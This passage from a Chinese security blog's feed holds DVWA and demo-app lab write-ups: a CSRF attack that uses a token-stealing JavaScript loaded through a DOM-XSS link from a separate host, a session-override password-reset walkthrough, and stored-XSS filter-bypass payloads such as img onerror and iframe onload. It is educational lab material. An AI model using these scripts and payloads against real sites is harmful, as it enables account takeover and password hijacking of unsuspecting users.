class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Issue with passwords matching</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个相较于Low，添加了Token的验证，而Token是每次访问改密页面时都会随机生成的，所以我们没法伪造Token去欺骗服务器</p><p>要想实现CSRF攻击就必须获取到用户的token，我们可以利用XSS漏洞执行JavaScript脚本来达到这个目的。这个脚本会自动模拟访问改密网页，并且截取到token，并使用这个token构造改密链接然后自动访问，从而使得”受害者“的密码被恶意修改</p><p>构造的js脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> theUrl = <span class="string">&#x27;http://127.0.0.1/DVWA/vulnerabilities/csrf/&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> pass = <span class="string">&#x27;1234&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)&#123;</span><br><span class="line">xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">xmlhttp = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> hacked = <span class="literal">false</span>;</span><br><span class="line">xmlhttp.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; xmlhttp.<span class="property">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> text = xmlhttp.<span class="property">responseText</span>;</span><br><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/user_token\&#x27; value\=\&#x27;(.*?)\&#x27; \/\&gt;/</span>;</span><br><span class="line"><span class="keyword">var</span> match = text.<span class="title function_">match</span>(regex);</span><br><span class="line"><span class="keyword">var</span> token = match[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">var</span> new_url = <span class="string">&#x27;http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=&#x27;</span> + pass + <span class="string">&#x27;&amp;password_conf=&#x27;</span> + pass + <span class="string">&#x27;&amp;Change=Change&amp;user_token=&#x27;</span> + token + <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!hacked)&#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;Got token:&#x27;</span> + match[<span class="number">1</span>]);</span><br><span class="line">hacked = <span class="literal">true</span>;</span><br><span class="line">xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,new_url,<span class="literal">false</span>);</span><br><span class="line">xmlhttp.<span class="title function_">send</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,theUrl,<span class="literal">false</span>);</span><br><span class="line">xmlhttp.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure><p>由于在High安全等级下DVWA也存在XSS漏洞，那么我们可以利用XSS漏洞去执行我们构造的JavaScript脚本，这里使用DOM型的XSS漏洞(具体介绍<a href="https://baymrx.me/posts/d3bdf29c.html#high-3">点此查看</a>)构造我们的恶意链接</p><p>构造的恶意链接为：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English#&lt;script src=&quot;http://192.168.47.62/csrfhack.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>将链接发送给“受害者”，如果“受害者”点开这个链接，就会执行我们构造的脚本，从而达到恶意修改密码的目的。同时这里要注意网站的同源策略。</p><p>受害者打开链接，会弹出我们抓取的token，然后退出账号在登陆就会发现密码已经被修改了。</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200704175443580.png" alt="image-20200704175443580"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 暑期实训 </tag>
            
            <tag> CSRF </tag>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>session覆盖攻击原理与实验</title>
      <link href="/posts/6c6ed729.html"/>
      <url>/posts/6c6ed729.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>实验使用session登陆的php demo源码进行测试，<a href="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/other/session.zip">源码下载链接</a></p><p>使用前需要先将数据库文件<code>cms.sql</code>导入到cms数据库（没有就先创建一个），默认有两个账户：admin/123456,admin1/admin</p></blockquote><h2 id="session覆盖简介">session覆盖简介</h2><p>session覆盖攻击是一种非常流行的针对session的攻击方式，攻击者通过截获正常用户在某个网站的session id，就可以模仿这个用户，实现下一步的攻击。通常会被用作恶意重置用户的密码。</p><h2 id="session覆盖过程">session覆盖过程</h2><p>使用浏览器访问我们的session源码网站目录，可以看到有账户、密码和密文的提交框</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200703163814695.png" alt="image-20200703163814695"></p><p>先使用admin账户登录，并输入密文<code>cxk</code>后登录</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200703191218726.png" alt="image-20200703191218726"></p><p>为了方便实验，在页面展示出了当前用户的session id</p><p>然后再打开另外一个浏览器，使用我们另外一个账号admin1登录，密文填写任意值</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200703191244473.png" alt="image-20200703191244473"></p><blockquote><p>这里使用另外一个浏览器是因为，在我们登录账号的时候，由于session的原因，浏览器会保存我们当前账号的登陆状态，如果不退出浏览器或者退出账号，就一直处于当前账号的登陆状态，无法登录进其他账号</p></blockquote><p>打开BurpSuite对admin1进行拦截，刷新页面，可以在BurpSuite里看到admin1的session id</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200703191412156.png" alt="image-20200703191412156"></p><p>将admin的session id改到在admin1抓的包中，然后点击Forward</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200703191459981.png" alt="image-20200703191459981"></p><p>可以看到，我们在admin1账户下看到了admin账户下的密文信息</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200703191628755.png" alt="image-20200703191628755"></p><p>至此，我们的session覆盖实验就成功了</p><h2 id="利用seesion覆盖实现密码重置">利用seesion覆盖实现密码重置</h2><p>如果某个网站对密码重置的流程不做过多的校验的话，可以使用session覆盖的方法对其他用户的密码进行恶意重置。具体流程如下：</p><ol><li><p>首先在网站注册一个自己的账号，并进入到密码重置流程中</p></li><li><p>继续重置流程，直至完成邮箱或者手机号校验（只剩填写新密码这一步）</p></li><li><p>在浏览器另开一个标签，进入另一个密码重置的页面</p></li><li><p>在输入完要攻击的账号信息，等服务器确认了你要恶意重置的账号后，再切换到第二步中填写新密码的页面</p></li><li><p>输入设置的新密码并提交就可以实现对其他账号的密码重置</p></li></ol><blockquote><p>注意这种利用session覆盖导致的密码重置漏洞并非所有网站都存在</p><p>参考：<a href="https://blog.csdn.net/zhangge3663/article/details/102814176">某网session覆盖导致重置密码漏洞</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> session </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA练习——XSS漏洞原理</title>
      <link href="/posts/d3bdf29c.html"/>
      <url>/posts/d3bdf29c.html</url>
      
        <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>XSS攻击（Cross Site Scripting，跨站脚本攻击）通常指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p><p>XSS漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是<strong>寻找参数未过滤的输出函数</strong></p><p>常见的输出函数有： <code>echo</code>、<code>printf</code>、<code>print</code>、<code>print_r</code>、<code>sprintf</code>、<code>die</code>、<code>var-dump</code>、<code>var_export</code></p><p>XSS主要分为三类：存储型XSS、反射型XSS和DOM型XSS</p><h2 id="DVWA——XSS原理学习-DVWA源码下载">DVWA——XSS原理学习[<a href="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/other/DVWA.zip">DVWA源码下载</a>]</h2><h3 id="DVWA——存储型XSS">DVWA——存储型XSS</h3><h4 id="什么是存储型XSS">什么是存储型XSS</h4><p>攻击者可以通过XSS漏洞将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。因为存储型XSS的代码存在于网页的代码中，可以说是永久型的。</p><p>存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p><h4 id="Low-2">Low</h4><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line"><span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize message input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line"><span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize name input</span></span><br><span class="line"><span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从源码中可以看出，这个对输入的东西没有任何过滤与检查，并且数据是存储在数据库中的。</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200702161331980.png" alt="image-20200702161331980"></p><p>在Message栏中输入 <code>&lt;script&gt;alert(123)&lt;/script&gt;</code>，Name随便填入一个值，点击<code>Sign Guestbook</code>提交数据</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200702162455354.png" alt="image-20200702162455354"></p><p>等页面刷新后会产生弹窗123，说明XSS漏洞存在并且能够利用成功。</p><p>再进行尝试也会发现Name框也是存在XSS漏洞的，但是它有10个字符的长度限制，我们可以使用F12的开发者工具修改长度限制，或者直接使用BurpSuite抓包注入绕过限制。</p><h4 id="Medium-2">Medium</h4><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line"><span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize message input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line"><span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize name input</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line"><span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，对于Message参数使用了<code>htmlspecialchars()</code>进行编码，所以无法在这里利用XSS注入代码。对于Name参数，只有一个字符串替换函数，它只过滤<code>&lt;script&gt;</code>，将<code>&lt;script&gt;</code>字符替换为空值，所以可以尝试使用双写或者大写绕过，亦或者使用img，iframe，a等标签绕过</p><p><strong>双写或者大写绕过：</strong></p><p><code>&lt;SCRIPT&gt;alert(234)&lt;/script&gt;</code> 和 <code>&lt;scr&lt;script&gt;ipt&gt;alert(234)&lt;/script&gt;</code></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200702165840119.png" alt="image-20200702165840119"></p><p>这里同样也需要多做一步绕过长度限制</p><p><strong>a标签</strong>绕过：</p><p>这里使用BurpSuite抓包以绕过长度限制</p><p>首先，Name参数和Message参数填写任意值并提交使BurpSuite拦截到数据包</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200702172455547.png" alt="image-20200702172455547"></p><p>然后修改下面的<code>txtName</code>参数为我们要注入的弹窗代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(789)</span>&gt;</span>Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200702172917834.png" alt="image-20200702172917834"></p><p>然后点击<code>Forward</code>发送请求包，关闭BP拦截，就可以在页面看到一个链接</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200702173103286.png" alt="image-20200702173103286"></p><p>点击链接就可以出发弹窗的恶意代码。</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200702173232457.png" alt="image-20200702173232457"></p><h4 id="High-2">High</h4><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line"><span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize message input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line"><span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize name input</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line"><span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过源码可以看到，Message参数依然不能注入，然而对于Name参数，有更高一级的过滤，不再是过滤字符串，而是直接过滤<code>&lt;script&gt;</code>标签，这里我们就无法再使用含有<code>&lt;script&gt;</code>标签的代码进行注入，可以换用其他方式进行注入</p><p>使用<strong>img标签</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">0</span> <span class="attr">onerror</span>=<span class="string">alert(345)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里将src的地址设置为一个不可能的地址，所以会报错触发alert弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200702171305834.png" alt="image-20200702171305834"></p><p>使用<strong>iframe标签</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(345)</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200702171227109.png" alt="image-20200702171227109"></p><h4 id="impossible">impossible</h4><p>再看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 